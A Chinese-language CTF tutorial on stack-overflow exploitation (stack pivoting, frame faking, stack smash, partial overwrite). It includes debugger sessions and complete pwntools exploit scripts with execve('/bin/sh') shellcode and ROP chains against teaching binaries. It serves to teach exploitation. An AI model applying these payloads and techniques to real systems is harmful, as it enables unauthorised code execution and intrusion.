#  花式棧溢出技巧

## stack pivoting

### 原理

stack pivoting，正如它所描述的，該技巧就是劫持棧指針指向攻擊者所能控制的內存處，然後再在相應的位置進行 ROP。一般來說，我們可能在以下情況需要使用 stack pivoting

- 可以控制的棧溢出的字節數較少，難以構造較長的 ROP 鏈
- 開啓了 PIE 保護，棧地址未知，我們可以將棧劫持到已知的區域。
- 其它漏洞難以利用，我們需要進行轉換，比如說將棧劫持到堆空間，從而在堆上寫 rop 及進行堆漏洞利用

此外，利用 stack pivoting 有以下幾個要求

- 可以控制程序執行流。

- 可以控制 sp 指針。一般來說，控制棧指針會使用 ROP，常見的控制棧指針的 gadgets 一般是

```asm
pop rsp/esp
```

當然，還會有一些其它的姿勢。比如說 libc_csu_init 中的 gadgets，我們通過偏移就可以得到控制 rsp 指針。上面的是正常的，下面的是偏移的。

```asm
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:	pop    rbx
0x40061b <__libc_csu_init+91>:	pop    rbp
0x40061c <__libc_csu_init+92>:	pop    r12
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:	pop    rsp
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret
```

  此外，還有更加高級的 fake frame。


- 存在可以控制內容的內存，一般有如下
  - bss 段。由於進程按頁分配內存，分配給 bss 段的內存大小至少一個頁(4k，0x1000)大小。然而一般bss段的內容用不了這麼多的空間，並且 bss 段分配的內存頁擁有讀寫權限。
  - heap。但是這個需要我們能夠泄露堆地址。

### 示例

#### 例1

這裏我們以 [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) 爲例進行介紹。首先，查看程序的安全保護，如下

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

可以看出源程序爲 32 位，也沒有開啓 NX 保護，下面我們來找一下程序的漏洞

```C
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

可以看出，源程序存在棧溢出漏洞。但是其所能溢出的字節就只有 50-0x20-4=14 個字節，所以我們很難執行一些比較好的 ROP。這裏我們就考慮 stack pivoting 。由於程序本身並沒有開啓堆棧保護，所以我們可以在棧上佈置shellcode 並執行。基本利用思路如下

- 利用棧溢出佈置 shellcode
- 控制 eip 指向 shellcode 處

第一步，還是比較容易地，直接讀取即可，但是由於程序本身會開啓 ASLR 保護，所以我們很難直接知道 shellcode 的地址。但是棧上相對偏移是固定的，所以我們可以利用棧溢出對 esp 進行操作，使其指向 shellcode 處，並且直接控制程序跳轉至 esp處。那下面就是找控制程序跳轉到 esp 處的 gadgets 了。

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```

這裏我們發現有一個可以直接跳轉到 esp 的 gadgets。那麼我們可以佈置 payload 如下

```text
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

那麼我們 payload 中的最後一部分改如何設置 esp 呢，可以知道

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

所以我們最後一段需要執行的指令就是

```asm
sub esp,0x28
jmp esp
```

所以最後的 exp 如下

```python
from pwn import *
sh = process('./b0verfl0w')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

#### 例2-轉移堆

待。

### 題目

- [EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)

## frame faking

正如這個技巧名字所說的那樣，這個技巧就是構造一個虛假的棧幀來控制程序的執行流。

### 原理

概括地講，我們在之前講的棧溢出不外乎兩種方式

- 控制程序 EIP
- 控制程序 EBP

其最終都是控制程序的執行流。在 frame faking 中，我們所利用的技巧便是同時控制 EBP 與 EIP，這樣我們在控制程序執行流的同時，也改變程序棧幀的位置。一般來說其 payload 如下

```
buffer padding|fake ebp|leave ret addr|
```

即我們利用棧溢出將棧上構造爲如上格式。這裏我們主要講下後面兩個部分

- 函數的返回地址被我們覆蓋爲執行 leave ret 的地址，這就表明了函數在正常執行完自己的 leave ret 後，還會再次執行一次 leave ret。
- 其中 fake ebp 爲我們構造的棧幀的基地址，需要注意的是這裏是一個地址。一般來說我們構造的假的棧幀如下

```
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```

這裏我們的 fake ebp 指向 ebp2，即它爲 ebp2 所在的地址。通常來說，這裏都是我們能夠控制的可讀的內容。

**下面的彙編語法是 intel 語法。**

在我們介紹基本的控制過程之前，我們還是有必要說一下，函數的入口點與出口點的基本操作

入口點

```
push ebp  # 將ebp壓棧
mov ebp, esp #將esp的值賦給ebp
```

出口點

```
leave
ret #pop eip，彈出棧頂元素作爲程序下一個執行地址
```

其中 leave 指令相當於

```
mov esp, ebp # 將ebp的值賦給esp
pop ebp # 彈出ebp
```

下面我們來仔細說一下基本的控制過程。

1. 在有棧溢出的程序執行 leave 時，其分爲兩個步驟

    - mov esp, ebp ，這會將 esp 也指向當前棧溢出漏洞的 ebp 基地址處。
    - pop ebp， 這會將棧中存放的 fake ebp 的值賦給 ebp。即執行完指令之後，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。

2. 執行 ret 指令，會再次執行 leave ret 指令。

3. 執行 leave 指令，其分爲兩個步驟

    - mov esp, ebp ，這會將 esp 指向 ebp2。
    - pop ebp，此時，會將 ebp 的內容設置爲 ebp2 的值，同時 esp 會指向 target function。

4. 執行 ret 指令，這時候程序就會執行 target function，當其進行程序的時候會執行

    - push ebp，會將 ebp2 值壓入棧中，

    - mov ebp, esp，將 ebp 指向當前基地址。

此時的棧結構如下

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2
```

5. 當程序執行時，其會正常申請空間，同時我們在棧上也安排了該函數對應的參數，所以程序會正常執行。

6. 程序結束後，其又會執行兩次 leave ret addr，所以如果我們在 ebp2 處佈置好了對應的內容，那麼我們就可以一直控制程序的執行流程。

可以看出在 fake frame 中，我們有一個需求就是，我們必須得有一塊可以寫的內存，並且我們還知道這塊內存的地址，這一點與 stack pivoting 相似。


### 2018 安恆杯 over
以 2018 年 6 月安恆杯月賽的 over 一題爲例進行介紹, 題目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over) 中找到

#### 文件信息
```bash
over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
[*] '/home/m4x/pwn_repo/others_over/over.over'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
64 位動態鏈接的程序, 沒有開 PIE 和 canary 保護, 但開了 
NX 保護  

#### 分析程序
放到 IDA 中進行分析 
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}

int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}
```
漏洞很明顯, read 能讀入 96 位, 但 buf 的長度只有 80, 因此能覆蓋 rbp 以及 ret addr 但也只能覆蓋到 rbp 和 ret addr, 因此也只能通過同時控制 rbp 以及 ret addr 來進行 rop 了

#### leak stack
爲了控制 rbp, 我們需要知道某些地址, 可以發現當輸入的長度爲 80 時, 由於 read 並不會給輸入末尾補上 '\0', rbp 的值就會被 puts 打印出來, 這樣我們就可以通過固定偏移知道棧上所有位置的地址了
```C
Breakpoint 1, 0x00000000004006b9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RBX  0x0
 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ff757354700 ◂— 0x7ff757354700
 R10  0x37b
 R11  0x246
 R12  0x400580 ◂— xor    ebp, ebp
 R13  0x7ffceaf112b0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RIP  0x4006b9 ◂— call   0x400530
─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x4006b9    call   puts@plt <0x400530>
        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

   0x4006be    leave
   0x4006bf    ret

   0x4006c0    push   rbp
   0x4006c1    mov    rbp, rsp
   0x4006c4    sub    rsp, 0x10
   0x4006c8    mov    dword ptr [rbp - 4], edi
   0x4006cb    mov    qword ptr [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
   0x4006d6    mov    ecx, 0
   0x4006db    mov    edx, 2
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0           4006b9
   f 1           400715
   f 2     7ff756de02b1 __libc_start_main+241
Breakpoint *0x4006B9
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)
```

leak 出棧地址後, 我們就可以通過控制 rbp 爲棧上的地址(如 0x7ffceaf11160), ret addr 爲 leave ret 的地址來實現控制程序流程了。 

比如我們可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 並控制其返回到 `sub_400676` 函數來 leak libc。 
​	 
然後在下一次利用時就可以通過 rop 執行 `system("/bin/sh")` 或 `execve("/bin/sh", 0, 0)` 來 get shell 了, 這道題目因爲輸入的長度足夠, 我們可以佈置調用 `execve("/bin/sh", 0, 0)` 的利用鏈, 這種方法更穩妥(`system("/bin/sh")` 可能會因爲 env 被破壞而失效), 不過由於利用過程中棧的結構會發生變化, 所以一些關鍵的偏移還需要通過調試來確定

#### exp
```python
from pwn import *
context.binary = "./over.over"

def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc

io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))


#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

pop_rdi_ret=0x400793
'''
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
0x00000000000f5279 : pop rdx ; pop rsi ; ret
'''
pop_rdx_pop_rsi_ret=libc.address+0xf5279


payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])

io.sendafter(">", payload)

io.interactive()
```

總的來說這種方法跟 stack pivot 差別並不是很大。

### 參考閱讀

- [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
- [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)

## Stack smash

### 原理


在程序加了canary 保護之後，如果我們讀取的 buffer 覆蓋了對應的值時，程序就會報錯，而一般來說我們並不會關心報錯信息。而 stack smash 技巧則就是利用打印這一信息的程序來得到我們想要的內容。這是因爲在程序啓動 canary 保護之後，如果發現 canary 被修改的話，程序就會執行 `__stack_chk_fail` 函數來打印 argv[0] 指針所指向的字符串，正常情況下，這個指針指向了程序名。其代碼如下

```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以說如果我們利用棧溢出覆蓋 argv[0] 爲我們想要輸出的字符串的地址，那麼在 `__fortify_fail` 函數中就會輸出我們想要的信息。



> 批註： 這個方法在 glibc-2.31 之後不可用了, 具體看這個部分代碼 [fortify_fail.c](https://elixir.bootlin.com/glibc/glibc-2.31/source/debug/fortify_fail.c) 。

```c
#include <stdio.h>

void
__attribute__ ((noreturn))
__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (do_abort, "*** %s ***: terminated\n", msg);
}
libc_hidden_def (__fortify_fail)
```

> 總結一下原因就是現在不會打印argv[0] 指針所指向的字符串

### 32C3 CTF readme

這裏，我們以 2015 年 32C3 CTF readme 爲例進行介紹，該題目在 [jarvisoj](https://www.jarvisoj.com/challenges) 上有復現。方便讀者復現, binary 也可以在 [ctf-challenge ](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stacksmashes/32c3-CTF-readme)這個倉庫找到

#### 確定保護

可以看出程序爲 64 位，主要開啓了 Canary 保護以及 NX 保護，以及 FORTIFY 保護。

```shell
➜  stacksmashes git:(master) ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

#### 分析程序

ida 看一下

```c
__int64 sub_4007E0()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 v4; // [sp+0h] [bp-128h]@1
  __int64 v5; // [sp+108h] [bp-20h]@1

  v5 = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets((__int64)&v4);
  if ( !v0 )
LABEL_9:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1 )
      goto LABEL_9;
    if ( v2 == '\n' )
      break;
    byte_600D20[v1++] = v2;
    if ( v1 == ' ' )
      goto LABEL_8;
  }
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
LABEL_8:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

很顯然，程序在 `_IO_gets((__int64)&v4)`; 存在棧溢出。

此外，程序中還提示要 overwrite flag。而且發現程序很有意思的在 while 循環之後執行了這條語句

```C
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
```

又看了看對應地址的內容，可以發現如下內容，說明程序的flag就在這裏。


```
.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0
```

但是如果我們直接利用棧溢出輸出該地址的內容是不可行的，這是因爲我們讀入的內容 ` byte_600D20[v1++] = v2;`也恰恰就是該塊內存，這會直接將其覆蓋掉，這時候我們就需要利用一個技巧了

- 在 ELF 內存映射時，bss 段會被映射兩次，所以我們可以使用另一處的地址來進行輸出，可以使用 gdb 的 find來進行查找。

#### 確定 flag 地址

我們把斷點下載 memset 函數處，然後讀取相應的內容如下

```asm
gef➤  c
Continuing.
Hello!
What's your name? qqqqqqq
Nice to meet you, qqqqqqq.
Please overwrite the flag: 222222222

Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
38	../sysdeps/x86_64/multiarch/memset-avx2.S: 沒有那個文件或目錄.
─────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
───────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffda38', 'l8']
8
0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e	 ← $rsp
0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)
0x00007fffffffda48│+0x10: 0x0000000000000000
0x00007fffffffda50│+0x18: 0x0000000000000000
0x00007fffffffda58│+0x20: 0x0000000000000000
0x00007fffffffda60│+0x28: 0x0000000000000000
0x00007fffffffda68│+0x30: 0x0000000000000000
0x00007fffffffda70│+0x38: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7b7f930 → Name: __memset_avx2()
[#1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────
gef➤  find 22222
Argument required (expression to compute).
gef➤  find '22222'
No symbol "22222" in current context.
gef➤  grep '22222'
[+] Searching '22222' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-
  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x601010 - 0x601019  →   "222222222" 
gef➤  grep PCTF
[+] Searching 'PCTF' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x
  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 
```

可以看出我們讀入的 2222 已經覆蓋了 0x600d20 處的 flag，但是我們在內存的 0x400d20 處仍然找到了這個flag的備份，所以我們還是可以將其輸出。這裏我們已經確定了 flag 的地址。

#### 確定偏移

下面，我們確定 argv[0] 距離讀取的字符串的偏移。

首先下斷點在 main 函數入口處，如下

```asm
gef➤  b *0x00000000004006D0
Breakpoint 1 at 0x4006d0
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 

Breakpoint 1, 0x00000000004006d0 in ?? ()
 code:i386:x86-64 ]────
     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
     0x4006c6 <_IO_gets@plt+6> push   0x9
     0x4006cb <_IO_gets@plt+11> jmp    0x400620
 →   0x4006d0                  sub    rsp, 0x8
     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
     0x4006db                  xor    esi, esi
     0x4006dd                  call   0x400660 <setbuf@plt>
──────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb78', 'l8']
8
0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax	 ← $rsp
0x00007fffffffdb80│+0x08: 0x0000000000000000
0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
0x00007fffffffdb90│+0x18: 0x0000000100000000
0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
0x00007fffffffdba0│+0x28: 0x0000000000000000
0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
──────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006d0 → sub rsp, 0x8
[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
---Type <return> to continue, or q <return> to quit---
[#2] 0x400717 → hlt 

```

可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我們修改的內容就是這個地址。同時0x00007fffffffdc58 處保留着該地址，所以我們真正需要的地址是 0x00007fffffffdc58。

此外，根據彙編代碼

```asm
.text:00000000004007E0                 push    rbp
.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
.text:00000000004007E6                 mov     edi, 1
.text:00000000004007EB                 push    rbx
.text:00000000004007EC                 sub     rsp, 118h
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
.text:0000000000400804                 xor     eax, eax
.text:0000000000400806                 call    ___printf_chk
.text:000000000040080B                 mov     rdi, rsp
.text:000000000040080E                 call    __IO_gets
```

我們可以確定我們讀入的字符串的起始地址其實就是調用 `__IO_gets` 之前的 rsp，所以我們把斷點下在 call 處，如下

```asm
gef➤  b *0x000000000040080E
Breakpoint 2 at 0x40080e
gef➤  c
Continuing.
Hello!
What's your name? 
Breakpoint 2, 0x000000000040080e in ?? ()
──────────────────────────[ code:i386:x86-64 ]────
     0x400804                  xor    eax, eax
     0x400806                  call   0x4006b0 <__printf_chk@plt>
     0x40080b                  mov    rdi, rsp
 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
        0x4006c6 <_IO_gets@plt+6> push   0x9
        0x4006cb <_IO_gets@plt+11> jmp    0x400620
        0x4006d0                  sub    rsp, 0x8
──────────────────[ stack ]────
['0x7fffffffda40', 'l8']
8
0x00007fffffffda40│+0x00: 0x0000ff0000000000	 ← $rsp, $rdi
0x00007fffffffda48│+0x08: 0x0000000000000000
0x00007fffffffda50│+0x10: 0x0000000000000000
0x00007fffffffda58│+0x18: 0x0000000000000000
0x00007fffffffda60│+0x20: 0x0000000000000000
0x00007fffffffda68│+0x28: 0x0000000000000000
0x00007fffffffda70│+0x30: 0x0000000000000000
0x00007fffffffda78│+0x38: 0x0000000000000000
────────────────────────────────────────────[ trace ]────
[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
──────────────────────────────────────────────────────────
gef➤  print $rsp
$1 = (void *) 0x7fffffffda40
```

可以看出rsp的值爲0x7fffffffda40，那麼相對偏移爲

```python
>>> 0x00007fffffffdc58-0x7fffffffda40
536
>>> hex(536)
'0x218'
```

#### 利用程序

我們構造利用程序如下

```python
from pwn import *
context.log_level = 'debug'
smash = ELF('./smashes')
if args['REMOTE']:
    sh = remote('pwn.jarvisoj.com', 9877)
else:
    sh = process('./smashes')
argv_addr = 0x00007fffffffdc58
name_addr = 0x7fffffffda40
flag_addr = 0x600D20
another_flag_addr = 0x400d20
payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
data = sh.recv()
sh.interactive()
```

這裏我們直接就得到了 flag，沒有出現網上說的得不到 flag 的情況。

### 題目
- 2018 網鼎杯 - guess

## 棧上的 partial overwrite
partial overwrite 這種技巧在很多地方都適用, 這裏先以棧上的 partial overwrite 爲例來介紹這種思想。

我們知道, 在開啓了隨機化（ASLR，PIE）後, 無論高位的地址如何變化，低 12 位的頁內偏移始終是固定的, 也就是說如果我們能更改低位的偏移, 就可以在一定程度上控制程序的執行流, 繞過 PIE 保護。

### 2018-安恆杯-babypie
以安恆杯 2018 年 7 月月賽的 babypie 爲例分析這一種利用技巧, 題目的 binary 放在了 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite) 中
#### 確定保護
```bash
babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
64 位動態鏈接的文件, 開啓了 PIE 保護和棧溢出保護
#### 分析程序
IDA 中看一下, 很容易就能發現漏洞點, 兩處輸入都有很明顯的棧溢出漏洞, 需要注意的是在輸入之前, 程序對棧空間進行了清零, 這樣我們就無法通過打印棧上信息來 leak binary 或者 libc 的基址了
```C
__int64 sub_960()
{
  char buf[40]; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  *(_OWORD *)buf = 0uLL;
  *(_OWORD *)&buf[16] = 0uLL;
  puts("Input your Name:");
  read(0, buf, 0x30uLL);                        // overflow
  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
  read(0, buf, 0x60uLL);                        // overflow
  return 0LL;
}
```

同時也發現程序中給了能直接 get shell 的函數
```asm
.text:0000000000000A3E getshell        proc near
.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
.text:0000000000000A3F                 mov     rbp, rsp
.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
.text:0000000000000A49                 call    _system
.text:0000000000000A4E                 nop
.text:0000000000000A4F                 pop     rbp
.text:0000000000000A50                 retn
.text:0000000000000A50 ; } // starts at A3E
.text:0000000000000A50 getshell        endp
```
這樣我們只要控制 rip 到該函數即可

#### leak canary
在第一次 read 之後緊接着就有一個輸出, 而 read 並不會給輸入的末尾加上 \0, 這就給了我們 leak 棧上內容的機會。

爲了第二次溢出能控制返回地址, 我們選擇 leak canary. 可以計算出第一次 read 需要的長度爲 0x30 - 0x8 + 1 (+ 1 是爲了覆蓋 canary 的最低位爲非 0 的值, printf 使用 %s 時, 遇到 \0 結束, 覆蓋 canary 低位爲非 0 值時, canary 就可以被 printf 打印出來了)

```asm
Breakpoint 1, 0x0000557c8443aa08 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x30
 RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */
 RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R9   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R10  0x37b
 R11  0x246
 R12  0x557c8443a830 ◂— xor    ebp, ebp
 R13  0x7ffd97aa0540 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
 RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
